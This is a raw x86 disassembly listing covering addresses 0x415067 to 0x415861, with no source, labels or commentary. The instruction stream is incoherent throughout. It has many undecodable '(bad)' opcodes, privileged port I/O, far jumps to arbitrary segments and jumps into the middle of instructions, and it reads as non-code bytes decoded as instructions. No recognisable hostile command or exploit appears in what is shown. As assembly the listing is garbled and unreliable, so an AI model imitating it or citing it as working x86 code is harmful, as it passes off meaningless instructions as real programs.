  415067:	scas   al,BYTE PTR es:[edi]
  415068:	sbb    edx,DWORD PTR [eax-0x7906752d]
  41506e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41506f:	gs xchg esi,eax
  415071:	adc    eax,0xb964e2a9
  415076:	push   ds
  415077:	add    al,0x75
  415079:	(bad)  [edx]
  41507b:	pop    ebp
  41507c:	rcl    BYTE PTR [edx-0x7a],0x4c
  415080:	fild   DWORD PTR [edx]
  415082:	xor    dl,al
  415084:	pop    ebx
  415085:	inc    esi
  415086:	fwait
  415087:	hlt    
  415088:	in     eax,0xf9
  41508a:	iret   
  41508b:	sub    BYTE PTR [edi],cl
  41508d:	lds    eax,FWORD PTR [edi+0x6dad58b1]
  415093:	in     eax,dx
  415094:	ins    BYTE PTR es:[edi],dx
  415095:	sbb    al,dh
  415097:	mov    esp,0x1632cf29
  41509c:	xchg   DWORD PTR [edi],esp
  41509e:	push   ds
  41509f:	ins    BYTE PTR es:[edi],dx
  4150a0:	add    eax,0xae13fb29
  4150a5:	xchg   BYTE PTR [ecx],ah
  4150a7:	(bad)  
  4150a8:	les    esi,FWORD PTR [esi-0x73]
  4150ab:	scas   al,BYTE PTR es:[edi]
  4150ac:	daa    
  4150ad:	hlt    
  4150ae:	loope  0x4150cb
  4150b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b1:	sbb    bl,ah
  4150b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b4:	push   ss
  4150b5:	nop
  4150b6:	mov    bh,BYTE PTR [eax-0x7f]
  4150b9:	je     0x4150b6
  4150bb:	js     0x4150a4
  4150bd:	jmp    0x415067
  4150bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150c0:	adc    dh,dl
  4150c2:	jl     0x4150fc
  4150c4:	mov    edx,0x3c41a80b
  4150c9:	js     0x415088
  4150cb:	xor    eax,0x7e7f5490
  4150d0:	idiv   DWORD PTR [edi+0x66]
  4150d3:	push   edi
  4150d4:	lahf   
  4150d5:	xchg   ecx,eax
  4150d6:	mov    ds:0xf31e39ce,eax
  4150db:	push   esp
  4150dc:	xchg   esp,eax
  4150dd:	jb     0x415099
  4150df:	or     eax,DWORD PTR [esi]
  4150e1:	mov    cs,WORD PTR [ebp+0x27]
  4150e4:	push   0x4c51cfc8
  4150e9:	ficomp WORD PTR [esi+edi*1]
  4150ec:	test   eax,eax
  4150ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ef:	inc    eax
  4150f0:	fst    QWORD PTR ds:[ebp-0x179b4e28]
  4150f7:	aad    0xad
  4150f9:	mov    ah,0xd2
  4150fb:	xchg   ecx,eax
  4150fc:	dec    ebp
  4150fd:	imul   ecx,DWORD PTR [esi+0x1ccede3c],0x19
  415104:	test   al,0xa4
  415106:	or     DWORD PTR [esi-0x69d6084e],0x95be0b05
  415110:	das    
  415111:	addr16 cli 
  415113:	ja     0x4150d7
  415115:	mov    dh,0x3a
  415117:	lods   al,BYTE PTR ds:[esi]
  415118:	sub    eax,0x55cd0691
  41511d:	imul   eax,edi,0x628f179e
  415123:	retf   
  415124:	mov    ds:0x7045b0d,al
  415129:	mov    dl,0x98
  41512b:	retf   0x4d55
  41512e:	or     BYTE PTR [edi+0x23a8c195],dh
  415134:	shr    ebp,1
  415136:	int    0xac
  415138:	jl     0x4150ef
  41513a:	jle    0x415126
  41513c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41513d:	and    al,0xd9
  415140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415141:	jg     0x415164
  415143:	pop    esi
  415144:	jbe    0x415193
  415146:	pushaw 
  415148:	dec    esp
  415149:	sti    
  41514a:	mov    dh,0x59
  41514c:	popa   
  41514d:	xor    cl,BYTE PTR [edi+ebx*1+0x6d]
  415151:	jne    0x41514d
  415153:	dec    edx
  415154:	lods   al,BYTE PTR ds:[esi]
  415155:	mov    ah,0x6c
  415157:	jnp    0x4151a9
  415159:	mov    ecx,0x9d23ac9
  41515e:	fcom   QWORD PTR [edi-0x19595efe]
  415164:	pop    eax
  415165:	mov    bl,0x34
  415167:	push   eax
  415168:	pop    ebx
  415169:	dec    ebp
  41516a:	dec    edx
  41516b:	and    BYTE PTR [eax],ch
  41516d:	add    edi,DWORD PTR [esi+0x534d184a]
  415173:	rcl    DWORD PTR [eax],cl
  415175:	mov    cl,0x50
  415177:	mov    esp,0x1d0a29b9
  41517c:	dec    esi
  41517d:	mov    edi,0x94b70d9b
  415182:	shr    BYTE PTR [edx+0x18],1
  415185:	(bad)  
  415186:	ret    
  415187:	fistp  WORD PTR [edi-0x4]
  41518a:	inc    edx
  41518b:	xor    al,0x87
  41518d:	(bad)  
  41518f:	aad    0x96
  415191:	icebp  
  415192:	jnp    0x41514d
  415194:	xor    ebx,DWORD PTR [esi]
  415196:	mov    ds:0xe77757f3,eax
  41519b:	adc    eax,0x21ccae5d
  4151a0:	and    al,0xb4
  4151a2:	push   0x3ee5941a
  4151a7:	je     0x415157
  4151a9:	bound  ebp,QWORD PTR [ecx+0x5ece4465]
  4151af:	leave  
  4151b0:	in     eax,dx
  4151b1:	neg    BYTE PTR [ebx]
  4151b3:	repnz sub esp,DWORD PTR [esp+edi*8-0x23]
  4151b8:	push   ebx
  4151b9:	sahf   
  4151ba:	rcr    BYTE PTR [esi],0xc5
  4151bd:	ins    DWORD PTR es:[edi],dx
  4151be:	stos   DWORD PTR es:[edi],eax
  4151bf:	sub    ebx,DWORD PTR [eax+0x11be10e]
  4151c5:	xchg   esp,eax
  4151c6:	pop    ss
  4151c7:	sbb    al,0xaf
  4151c9:	inc    ecx
  4151ca:	retf   0x1af3
  4151cd:	jl     0x415247
  4151cf:	lods   al,BYTE PTR ds:[esi]
  4151d0:	pop    esp
  4151d1:	add    eax,0xf2422923
  4151d6:	fs in  eax,0x44
  4151d9:	mov    bl,0x5d
  4151db:	es loope 0x4151f9
  4151de:	jne    0x4151e5
  4151e0:	or     al,0x6c
  4151e3:	(bad)  
  4151e4:	xlat   BYTE PTR ds:[ebx]
  4151e5:	mov    al,ds:0xf78c151d
  4151ea:	push   ecx
  4151eb:	aaa    
  4151ec:	adc    BYTE PTR [esi],0x9a
  4151ef:	push   esp
  4151f0:	in     al,0xa8
  4151f2:	push   eax
  4151f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f4:	cli    
  4151f5:	mov    edx,0x4e732b0a
  4151fa:	ret    0x43ff
  4151fd:	fcmovnu st,st(4)
  4151ff:	test   DWORD PTR [ebp-0x5d18459d],edi
  415205:	mov    ds:0xbf17d347,eax
  41520a:	jl     0x4151fa
  41520c:	add    al,0xe4
  41520e:	push   ebp
  41520f:	mov    ecx,0x5a3583e9
  415214:	mov    al,ds:0xe447c42c
  415219:	and    eax,0xe4a2d2a8
  41521e:	rol    DWORD PTR [esi],1
  415220:	add    DWORD PTR [edi+0x10fd73a4],ebp
  415226:	aas    
  415227:	dec    BYTE PTR [esi-0x4c]
  41522a:	fld    TBYTE PTR [ebp-0x62277bc8]
  415230:	imul   ecx,DWORD PTR [edi],0x7a2d67e
  415236:	int    0x25
  415238:	icebp  
  415239:	movzx  esp,WORD PTR [eax+0x6755649a]
  415240:	ret    0xdc44
  415243:	inc    edi
  415244:	jmp    0x4151cd
  415246:	mov    edx,0x41d110a3
  41524b:	xchg   DWORD PTR [edx+0x2d0b3dc5],eax
  415251:	popf   
  415252:	push   eax
  415253:	rcl    esp,0xbe
  415256:	iret   
  415257:	xchg   esp,eax
  415258:	aaa    
  415259:	stc    
  41525a:	mov    ?,WORD PTR [esi-0x2e9fe79d]
  415260:	push   eax
  415261:	mov    esi,0xde86efb9
  415266:	data16 js 0x41526d
  415269:	pop    esp
  41526a:	imul   ebp,DWORD PTR [esi-0x7f490f39],0xd4d1510c
  415274:	in     al,0x44
  415276:	retf   0x8dfc
  415279:	repnz xor DWORD PTR [edi-0x70018d7a],eax
  415280:	sar    BYTE PTR [edx+0x69150c2c],1
  415286:	mov    ebp,0xcf22c3d
  41528b:	adc    DWORD PTR [ebx+0x6a563011],edx
  415291:	adc    edx,DWORD PTR [esi+esi*2-0x448772fa]
  415298:	or     eax,esp
  41529a:	ret    0x3725
  41529d:	mov    ecx,0xef1d6dc1
  4152a2:	popa   
  4152a3:	inc    esi
  4152a4:	mov    WORD PTR [ebx],cs
  4152a6:	retf   0x82a6
  4152a9:	ds in  eax,dx
  4152ab:	xchg   ebx,eax
  4152ac:	mov    fs,WORD PTR [edi+0x26fe6b85]
  4152b2:	sar    DWORD PTR [ecx+ecx*2],1
  4152b5:	int3   
  4152b6:	pop    ss
  4152b7:	mov    WORD PTR [edi+0x7a],ds
  4152ba:	pop    edi
  4152bb:	dec    DWORD PTR [esi-0x14a02bc1]
  4152c1:	hlt    
  4152c2:	hlt    
  4152c3:	xor    eax,0xa91955d7
  4152c8:	push   ecx
  4152c9:	(bad)  
  4152cc:	jecxz  0x415330
  4152ce:	ret    0xd17c
  4152d1:	mov    ebx,0x14f50f7
  4152d6:	dec    esp
  4152d7:	pop    esp
  4152d8:	in     eax,dx
  4152d9:	mov    DWORD PTR [edi-0x4abbd29],ecx
  4152df:	pushf  
  4152e0:	push   eax
  4152e1:	shl    DWORD PTR [edx-0x75],1
  4152e4:	sti    
  4152e5:	xchg   ebp,eax
  4152e6:	mov    DWORD PTR [esi],edx
  4152e8:	xchg   ebp,eax
  4152e9:	jle    0x41535e
  4152eb:	and    eax,0x8a5e118
  4152f0:	inc    edi
  4152f1:	xor    al,0x3a
  4152f3:	ret    
  4152f4:	mov    dl,bh
  4152f6:	mov    al,0x68
  4152f8:	imul   edx,DWORD PTR cs:[edx+eax*2],0xffffff8c
  4152fd:	and    bl,al
  4152ff:	inc    ebp
  415300:	jp     0x4152cb
  415302:	fwait
  415303:	and    esp,DWORD PTR [esi-0x71]
  415306:	stos   BYTE PTR es:[edi],al
  415307:	pop    eax
  415308:	je     0x4152a8
  41530a:	push   cs
  41530b:	xor    ecx,ebx
  41530d:	jns    0x41536f
  41530f:	or     eax,0x7ad677e9
  415314:	repz sub eax,0x1665e18b
  41531a:	jbe    0x41533f
  41531c:	dec    esp
  41531d:	repnz cmp edi,DWORD PTR [edx]
  415320:	repnz inc edi
  415322:	dec    edi
  415323:	sti    
  415324:	and    al,0x7
  415326:	mov    ds:0xb9c571e2,eax
  41532b:	cmp    dl,BYTE PTR [ecx+ebx*8-0x4b]
  41532f:	mov    edi,ss
  415331:	ret    0x68c7
  415334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415335:	and    DWORD PTR ds:0xf08dbd87,ebx
  41533b:	cmp    dh,BYTE PTR [esi+0xb]
  41533e:	daa    
  41533f:	pop    edi
  415340:	push   ss
  415341:	add    BYTE PTR [ecx-0x70127456],ah
  415347:	inc    ebp
  415348:	clc    
  415349:	out    dx,al
  41534a:	push   ebp
  41534b:	xor    eax,0xc5a69bc5
  415350:	rol    DWORD PTR [ecx-0x274335e4],cl
  415356:	icebp  
  415357:	stos   DWORD PTR es:[edi],eax
  415358:	cmp    al,0x1
  41535a:	sbb    BYTE PTR [edi+0x48ac6461],cl
  415360:	repnz pop edx
  415362:	push   es
  415363:	cmp    esi,DWORD PTR [ecx+0x33]
  415366:	xchg   esp,eax
  415367:	scas   eax,DWORD PTR es:[edi]
  415368:	into   
  415369:	test   edi,ebx
  41536b:	scas   al,BYTE PTR es:[edi]
  41536c:	push   ebp
  41536d:	or     DWORD PTR [eax+0x7ea70ad0],0xffffffef
  415374:	aas    
  415375:	cld    
  415376:	sahf   
  415377:	inc    ecx
  415378:	dec    ecx
  415379:	sbb    BYTE PTR [eax-0x1d],al
  41537c:	jmp    FWORD PTR [ebx+0x47fccd27]
  415382:	ds lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415386:	jae    0x4153df
  415388:	dec    eax
  415389:	arpl   bx,dx
  41538b:	adc    dh,cl
  41538d:	push   ebp
  41538e:	neg    al
  415390:	push   edx
  415391:	xor    bl,dh
  415393:	daa    
  415394:	and    al,0x9c
  415396:	dec    DWORD PTR [eax-0x9e9a427]
  41539c:	pop    edi
  41539d:	test   BYTE PTR [esi+0x3a214597],ch
  4153a3:	ss xchg esp,eax
  4153a5:	in     al,0x6f
  4153a7:	adc    al,0xdd
  4153a9:	push   edi
  4153aa:	mov    ecx,0xd8c19e0b
  4153af:	inc    esp
  4153b0:	mov    ah,0xe4
  4153b2:	jbe    0x415397
  4153b4:	pusha  
  4153b5:	inc    edx
  4153b6:	mov    esp,0x5d107ce2
  4153bb:	jno    0x415434
  4153bd:	mov    dh,BYTE PTR [ebp+0x2afd0ff9]
  4153c3:	jb     0x415410
  4153c5:	push   0x65
  4153c7:	pop    edx
  4153c8:	add    DWORD PTR [edx],0xffffff97
  4153cb:	fidivr DWORD PTR [ebx+0x36]
  4153ce:	pop    ebx
  4153cf:	aaa    
  4153d0:	(bad)  
  4153d1:	clc    
  4153d2:	and    eax,0x141def6c
  4153d7:	and    ch,BYTE PTR [ebx-0x7597bce6]
  4153dd:	repz lds ebx,FWORD PTR [edx-0xd7cee97]
  4153e4:	rcr    DWORD PTR [ecx-0x3c],0xd3
  4153e8:	nop
  4153e9:	addr16 mov ds:0xea23,eax
  4153ed:	and    ebp,DWORD PTR ds:0xb0c16e89
  4153f3:	or     BYTE PTR [ecx+0x34],dl
  4153f6:	xchg   BYTE PTR [ebx],ch
  4153f8:	dec    edx
  4153f9:	call   0xff24cd49
  4153fe:	push   ds
  4153ff:	cld    
  415400:	out    0x51,al
  415402:	inc    BYTE PTR [edi+0x2f]
  415405:	jmp    0xd5f:0x30330857
  41540c:	xchg   esi,eax
  41540d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41540e:	jg     0x4153cf
  415410:	sub    eax,0x2cee946d
  415415:	or     DWORD PTR [ebx+0x17],ecx
  415418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415419:	xor    al,0x3e
  41541b:	mov    eax,DWORD PTR [ecx-0x750e6b25]
  415421:	hlt    
  415422:	adc    eax,0x8fb1d8a0
  415427:	push   esp
  415428:	or     ecx,edx
  41542a:	push   0x47
  41542c:	xor    cl,dl
  41542e:	push   eax
  41542f:	imul   edx,ecx,0x4bb9cf3f
  415435:	add    cl,BYTE PTR [ebp-0x4d]
  415438:	dec    esp
  415439:	inc    ebp
  41543a:	test   ecx,ebx
  41543c:	sti    
  41543d:	pop    ecx
  41543e:	jb     0x415482
  415440:	add    al,0xf5
  415442:	fcomp  st(6)
  415444:	outs   dx,DWORD PTR ds:[esi]
  415445:	fcmove st,st(4)
  415447:	call   0x5186:0xf3c33add
  41544e:	fs daa 
  415450:	fnstsw WORD PTR [ecx-0x39]
  415453:	pusha  
  415454:	enter  0xd1cf,0x92
  415458:	aas    
  415459:	or     DWORD PTR [edx+0x5a],edx
  41545c:	test   edx,ebx
  41545e:	mov    al,0x3a
  415460:	sbb    bh,BYTE PTR [eax]
  415462:	pop    esp
  415463:	cmp    ch,al
  415465:	rol    DWORD PTR [ebp-0x7d],cl
  415468:	repz and DWORD PTR [edi],ebx
  41546b:	xor    ebx,DWORD PTR [edx+edi*8-0xe]
  41546f:	cmp    bh,BYTE PTR [ebx+0x453fb58b]
  415475:	js     0x41545b
  415477:	dec    eax
  415478:	mov    bl,0x98
  41547a:	cmp    eax,0x86e0f450
  41547f:	lds    ebx,FWORD PTR [edi+0x35c7c921]
  415485:	jne    0x4154f9
  415487:	arpl   WORD PTR ds:0x2e10c97b,sp
  41548d:	nop
  41548e:	sar    BYTE PTR [edi],1
  415490:	pop    ecx
  415491:	xor    al,0xf
  415493:	sub    ch,bh
  415495:	add    bh,BYTE PTR [ebx-0x37158bba]
  41549b:	mov    ch,0xef
  41549d:	pushf  
  41549e:	(bad)  
  41549f:	jge    0x4154fb
  4154a1:	stos   BYTE PTR es:[edi],al
  4154a2:	mov    ebx,DWORD PTR [ecx+0x60]
  4154a5:	(bad)  
  4154a6:	fdiv   st(0),st
  4154a8:	int    0x23
  4154aa:	hlt    
  4154ab:	test   edi,edi
  4154ad:	(bad)  
  4154ae:	pop    ds
  4154af:	jae    0x4154f2
  4154b1:	ins    BYTE PTR es:[edi],dx
  4154b2:	shl    ebx,0x2b
  4154b5:	xchg   ecx,eax
  4154b6:	adc    al,0x69
  4154b8:	add    ecx,DWORD PTR [ebx-0x20]
  4154bb:	cs pop es
  4154bd:	daa    
  4154be:	inc    eax
  4154bf:	stos   DWORD PTR es:[edi],eax
  4154c0:	mov    es,WORD PTR [edx+0x7e69e541]
  4154c6:	mov    dl,0xda
  4154c8:	jo     0x41553a
  4154ca:	push   edi
  4154cb:	ins    BYTE PTR es:[edi],dx
  4154cc:	retf   0x2a3d
  4154cf:	mov    DWORD PTR [eax-0x64e353ae],ebp
  4154d5:	adc    al,0x77
  4154d7:	inc    edx
  4154d8:	push   es
  4154d9:	and    DWORD PTR [ebp+0x42],0xd746c86
  4154e0:	retf   0x2e56
  4154e3:	fiadd  WORD PTR [ebx-0x7b3f15ad]
  4154e9:	push   0xee6c066a
  4154ee:	pop    edx
  4154ef:	cmc    
  4154f0:	mov    eax,0x41e3ab63
  4154f5:	jmp    0x5efeb3ad
  4154fa:	scas   eax,DWORD PTR es:[edi]
  4154fb:	xor    ecx,DWORD PTR [edi-0x184a658c]
  415501:	dec    esi
  415502:	mov    dl,0x28
  415504:	jo     0x41549c
  415506:	push   0xffffffa4
  415508:	loope  0x4154d2
  41550a:	aad    0x89
  41550c:	(bad)  
  41550d:	fidiv  WORD PTR [edi]
  41550f:	daa    
  415510:	imul   ebp,DWORD PTR ds:0xeb628fc1,0xffffffe1
  415517:	jns    0x4154f6
  415519:	or     BYTE PTR [eax-0x1d],al
  41551c:	and    al,0xb2
  41551e:	xor    eax,0xdfea16f2
  415523:	data16 xlat BYTE PTR ds:[ebx]
  415525:	adc    dh,BYTE PTR [ebx-0x63]
  415528:	dec    esi
  415529:	cwde   
  41552a:	and    DWORD PTR [ebp-0x268cd630],0xffffffbf
  415531:	mov    edx,0xacc3952e
  415536:	xchg   al,dh
  415538:	into   
  415539:	(bad)  
  41553a:	fisubr WORD PTR [edx]
  41553c:	loopne 0x4154d2
  41553e:	jp     0x4154cc
  415540:	leave  
  415541:	test   DWORD PTR [ecx-0x4bca6d74],ebx
  415547:	mov    al,0x12
  415549:	lahf   
  41554a:	and    ebx,DWORD PTR [edi-0x59]
  41554d:	fadd   DWORD PTR [eax+0xc]
  415550:	mov    DWORD PTR [ebx+0x2b8a97a5],ebp
  415556:	lds    edi,FWORD PTR [esi+edx*4+0x2b]
  41555a:	mov    bh,0x76
  41555c:	and    eax,0xf1b6314c
  415561:	mov    ds:0xe32509b4,eax
  415566:	out    dx,al
  415567:	js     0x415592
  415569:	imul   edx,DWORD PTR [eax-0x59],0xffffffe9
  41556d:	xor    al,0x31
  41556f:	into   
  415570:	pop    ds
  415571:	(bad)  
  415572:	outs   dx,DWORD PTR ds:[esi]
  415573:	fsubr  st,st(6)
  415575:	loope  0x4155f6
  415577:	sbb    BYTE PTR [edx],al
  415579:	test   DWORD PTR [ecx+0x277639e6],ebx
  41557f:	stc    
  415580:	scas   eax,DWORD PTR es:[edi]
  415581:	sub    BYTE PTR [esi-0x57],0xdd
  415585:	inc    ebp
  415586:	push   ecx
  415587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415588:	stos   BYTE PTR es:[edi],al
  415589:	daa    
  41558a:	or     BYTE PTR [ebx+eax*8+0x7f841ec6],cl
  415591:	mov    DWORD PTR [eax-0x3a521dbb],ebp
  415597:	mov    ebx,DWORD PTR [ecx+0x6fc74c5a]
  41559d:	push   0x3f
  41559f:	(bad)  
  4155a0:	stos   BYTE PTR es:[edi],al
  4155a1:	sub    al,0xcc
  4155a3:	push   edx
  4155a4:	mov    ds:0xfca6b1b8,eax
  4155a9:	mov    al,ds:0x3188e1b9
  4155ae:	fist   WORD PTR [ebp+0x59]
  4155b1:	call   0x60a1:0x3720a2f5
  4155b8:	xor    cl,BYTE PTR ds:0x454e8289
  4155be:	xor    al,al
  4155c0:	imul   eax,DWORD PTR [ebx+0x55],0x19b32f10
  4155c7:	retf   
  4155c8:	fadd   QWORD PTR [edx-0x154e2fb4]
  4155ce:	inc    eax
  4155cf:	ret    
  4155d0:	cmp    BYTE PTR [ebx-0x503927f5],ah
  4155d6:	push   ss
  4155d7:	sub    eax,0xe8e64b25
  4155dc:	mov    esp,0xd8f6643e
  4155e1:	stc    
  4155e2:	mov    BYTE PTR [esi-0x519a8833],dl
  4155e8:	lods   eax,DWORD PTR ds:[esi]
  4155e9:	lock adc al,0xbb
  4155ec:	cmp    ch,BYTE PTR [eax-0x11]
  4155ef:	imul   edi,DWORD PTR [ebx],0xffffffae
  4155f2:	dec    esp
  4155f3:	rcl    edi,1
  4155f5:	xchg   ebx,eax
  4155f6:	mov    DWORD PTR [ecx],edx
  4155f8:	std    
  4155f9:	faddp  st(0),st
  4155fb:	sar    BYTE PTR [eax],cl
  4155fd:	push   cs
  4155fe:	sub    eax,0xcd2f23e2
  415603:	sbb    bh,BYTE PTR [eax-0x76]
  415606:	loopne 0x4155cf
  415608:	pop    esp
  415609:	pop    ds
  41560a:	inc    ecx
  41560b:	clc    
  41560c:	or     cl,BYTE PTR [ebp+0x261867ea]
  415612:	lahf   
  415613:	jne    0x41567d
  415615:	loope  0x415688
  415617:	stc    
  415618:	sub    cl,BYTE PTR [edi+eax*1-0x1f]
  41561c:	mov    esi,0x2a94448c
  415621:	ss mov eax,0x9f1770e5
  415627:	nop
  415628:	xchg   edi,eax
  415629:	lahf   
  41562a:	or     al,0x96
  41562c:	out    dx,al
  41562d:	xchg   ecx,eax
  41562e:	push   0xffffff9e
  415630:	sbb    al,0xfd
  415632:	jecxz  0x415612
  415634:	mov    cs,WORD PTR [esi]
  415636:	fs out dx,eax
  415638:	push   0x2c
  41563a:	mov    al,ds:0x9132186d
  41563f:	mov    bh,BYTE PTR [edi+0x67624f05]
  415645:	sub    BYTE PTR [ebp+0x64],al
  415648:	test   al,0x17
  41564a:	jno    0x415636
  41564c:	dec    ecx
  41564d:	inc    ecx
  41564e:	retf   0x16a4
  415651:	adc    cl,BYTE PTR [edi+0x1a]
  415654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415655:	cmp    DWORD PTR [edx+0xb],0xb3f664bb
  41565c:	clc    
  41565d:	loop   0x415659
  41565f:	loopne 0x415625
  415661:	gs pusha 
  415663:	pop    ss
  415664:	out    0xf4,al
  415666:	inc    eax
  415667:	call   0x58588ad6
  41566c:	ins    BYTE PTR es:[edi],dx
  41566d:	les    esp,FWORD PTR [ebx+0x7c277405]
  415673:	and    dl,BYTE PTR [edi+ebp*8-0x4]
  415677:	(bad)  
  415678:	and    ecx,DWORD PTR [eax-0x53]
  41567b:	aad    0xdf
  41567d:	push   esp
  41567e:	pusha  
  41567f:	mov    bh,0xd
  415681:	xlat   BYTE PTR ds:[ebx]
  415682:	int3   
  415683:	js     0x415611
  415685:	mov    ds:0xd214f8c4,eax
  41568a:	sub    al,0xd5
  41568c:	mov    ds:0xc3729b9,eax
  415691:	mov    al,ds:0xe87ce745
  415696:	addr16 cmc 
  415698:	and    cl,BYTE PTR [esp+edi*2]
  41569b:	jmp    DWORD PTR [ebp+0x56]
  41569e:	cmp    ebx,eax
  4156a0:	xchg   edx,eax
  4156a1:	call   0x4e9b:0x25e9f216
  4156a8:	out    dx,eax
  4156a9:	aas    
  4156aa:	fisubr WORD PTR ds:0xd5e7d1a2
  4156b0:	ins    BYTE PTR es:[edi],dx
  4156b1:	pusha  
  4156b2:	dec    edx
  4156b3:	jbe    0x41564d
  4156b5:	add    BYTE PTR [ebp-0x6c],bl
  4156b8:	test   eax,0x9dc39b5e
  4156bd:	jge    0x415712
  4156bf:	out    dx,al
  4156c0:	mov    ds:0xc27373a,al
  4156c5:	popa   
  4156c6:	out    0xbf,al
  4156c8:	mov    ch,0xff
  4156ca:	pop    esi
  4156cb:	or     al,0x6e
  4156cd:	inc    ebx
  4156ce:	arpl   WORD PTR cs:[ecx-0x18],bx
  4156d2:	adc    BYTE PTR [edi+0x70f780fd],cl
  4156d8:	sub    al,0x88
  4156da:	sub    edi,DWORD PTR [ebx+ebx*8-0x7e50a7e7]
  4156e1:	or     dl,bl
  4156e3:	inc    edx
  4156e4:	pop    esp
  4156e5:	sbb    BYTE PTR [ebx+0x2c],dl
  4156e8:	push   eax
  4156e9:	jmp    0xc82:0xf7b7ea36
  4156f0:	push   ss
  4156f1:	mov    esi,0x54a486e7
  4156f6:	add    BYTE PTR [eax+edx*2+0x39852eae],0x5b
  4156fe:	in     eax,dx
  4156ff:	or     edi,DWORD PTR [ebp+0x5fe9e0e9]
  415705:	mov    ds:0x2b1efb8d,eax
  41570a:	cmc    
  41570b:	mov    ah,BYTE PTR [ebx]
  41570d:	add    cl,dl
  41570f:	in     eax,0x5f
  415711:	and    ch,BYTE PTR [ecx+0x786164a4]
  415717:	retf   
  415718:	ret    0x80e8
  41571b:	int3   
  41571c:	jmp    0x5d2e3a19
  415721:	or     ebx,DWORD PTR [ecx-0x12]
  415724:	mov    edx,0x6d09cc4
  415729:	sbb    BYTE PTR [ebp-0x79c510e7],ah
  41572f:	fidivr WORD PTR [ebp+0x3562724e]
  415735:	js     0x41571c
  415737:	leave  
  415738:	mov    edi,0x7520a949
  41573d:	and    BYTE PTR [esi+ebx*4-0x5c60fdf6],dh
  415744:	repnz loop 0x415785
  415747:	shl    BYTE PTR [ebx],1
  415749:	adc    cl,0x32
  41574c:	inc    ebx
  41574d:	or     cl,BYTE PTR [ecx+0x1e]
  415750:	icebp  
  415751:	cwde   
  415752:	and    al,bl
  415754:	fcomp  QWORD PTR [ebp-0x6d5c22e6]
  41575a:	lock pop ds
  41575c:	cdq    
  41575d:	not    DWORD PTR [eax-0x2e1b512f]
  415763:	arpl   WORD PTR ds:0xfc2a0917,si
  415769:	enter  0xbd22,0x93
  41576d:	(bad)  
  41576e:	sub    al,0x3e
  415770:	and    bh,BYTE PTR [esi-0x18f498b4]
  415776:	cmp    edx,DWORD PTR [esi-0x2c]
  415779:	adc    al,0xca
  41577b:	xchg   ecx,eax
  41577c:	dec    eax
  41577d:	cmc    
  41577e:	stos   DWORD PTR es:[edi],eax
  41577f:	cli    
  415780:	fsubp  st(7),st
  415782:	ja     0x4157a5
  415784:	in     al,dx
  415785:	push   ss
  415786:	jp     0x4157f8
  415788:	std    
  415789:	jmp    0xf8c5:0x97528e60
  415790:	sbb    al,0x50
  415792:	test   eax,0x4fd00c91
  415797:	test   DWORD PTR cs:[esi+0x4],ecx
  41579b:	jo     0x4157a1
  41579d:	xor    eax,0xa5ae2e35
  4157a2:	add    eax,0x3c318687
  4157a7:	loop   0x415732
  4157a9:	retf   0x7c7a
  4157ac:	push   es
  4157ad:	fcmovnbe st,st(5)
  4157af:	push   cs
  4157b0:	push   esp
  4157b1:	std    
  4157b2:	jle    0x41576a
  4157b4:	sbb    al,0xbc
  4157b6:	adc    bh,BYTE PTR [edi]
  4157b8:	lods   al,BYTE PTR ds:[esi]
  4157b9:	outs   dx,DWORD PTR ds:[esi]
  4157ba:	inc    esp
  4157bb:	mov    WORD PTR [eax-0x4c],ss
  4157be:	push   0x7a
  4157c0:	xor    dh,BYTE PTR [edx]
  4157c2:	cwde   
  4157c3:	xchg   esp,eax
  4157c4:	lods   eax,DWORD PTR ds:[esi]
  4157c5:	pop    ebx
  4157c6:	(bad)  
  4157c7:	in     eax,dx
  4157c8:	dec    edi
  4157c9:	cmp    cl,BYTE PTR [ecx]
  4157cb:	push   esi
  4157cc:	and    BYTE PTR [edx-0x42dcbcbe],cl
  4157d2:	mov    cl,BYTE PTR [esi+0x5d7d00da]
  4157d8:	scas   al,BYTE PTR es:[edi]
  4157d9:	test   eax,0xe9c0f6be
  4157de:	stc    
  4157df:	and    ch,BYTE PTR [ebx]
  4157e1:	cs cld 
  4157e3:	mov    DWORD PTR [esi+0x12c1bb5b],0x27e70848
  4157ed:	or     BYTE PTR [edx],dl
  4157ef:	lods   al,BYTE PTR ds:[esi]
  4157f0:	push   0x143719e3
  4157f5:	repnz sub eax,0x480b3501
  4157fb:	fdiv   QWORD PTR [edx]
  4157fd:	cli    
  4157fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ff:	pop    es
  415800:	and    edi,edx
  415802:	call   FWORD PTR [ecx+edx*1-0x2f425e1d]
  415809:	jge    0x41583a
  41580b:	lock mov edi,0xd2f2e80
  415811:	test   BYTE PTR [ebp-0x1d3f6505],0x63
  415818:	or     DWORD PTR [eax-0x7eca826e],edi
  41581e:	out    0xfd,eax
  415820:	mov    bl,0x7
  415822:	sub    dl,BYTE PTR [eax]
  415824:	lea    eax,[ebp-0xff9f295]
  41582a:	add    eax,0xc57eea71
  41582f:	and    BYTE PTR [ebx+0x6],ch
  415832:	jae    0x41585a
  415834:	stos   DWORD PTR es:[edi],eax
  415835:	xchg   BYTE PTR [ebp+0x8],ch
  415838:	cmp    ebx,DWORD PTR [edx]
  41583a:	add    bh,bl
  41583c:	push   ebx
  41583d:	jmp    0x89343645
  415842:	mov    bh,0x5b
  415844:	and    DWORD PTR [esi-0x3f82c5b5],0x75915fe7
  41584e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584f:	gs jge 0xd3a29125
  415856:	ret    0x9a33
  415859:	push   esi
  41585a:	or     bl,bh
  41585c:	xchg   esi,eax
  41585d:	jbe    0x4157ed
  41585f:	jno    0x4158c6
  415861:	cmp    DWORD PTR [ecx],esi
